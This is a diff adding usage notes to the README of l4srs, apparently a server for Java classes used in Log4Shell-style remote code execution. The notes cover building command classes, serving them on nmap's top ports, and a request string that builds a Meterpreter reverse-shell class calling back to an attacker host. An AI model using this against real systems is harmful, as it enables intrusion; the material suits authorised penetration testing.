@@ -19,3 +19,24 @@ This version no longer requires javac to be installed.  It still
 allows for dynamic "class building" but does so by altering 
 precompiled classes embeded in the executable.
 
+This version adds the top 100 and top 1000 ports as defined by nmap.
+use the --pC100 or the --pC1000 options.
+
+Typical use case is to build command class(es) then run the server.
+`l4srs build -c Cmd1 -l firefox -w Calc.exe`
+`l4srs build -c TouchMe -l "touch /tmp/me"`
+
+you can then request Cmd1 and this will launch firefox on linux 
+and Calc on Windows.  It you request TouchMe it will touch 
+/tmp/me on linux and on windows it will not execute anything.
+
+you can then run `l4srs run --pC100` to start the server on the
+top 100 ports and can serve Cmd1 or TouchMe.
+
+Additionaly if you request MM:Host:port it will dynamically
+create a mini meterpreter class that will reach out to the
+host and port in the request.  If your msfconsole is running
+on 10.20.30.40 on port 4444 you would request MM:10.20.30.40:4444
+this is not built with the build command it is dymaically built
+on the request.
+
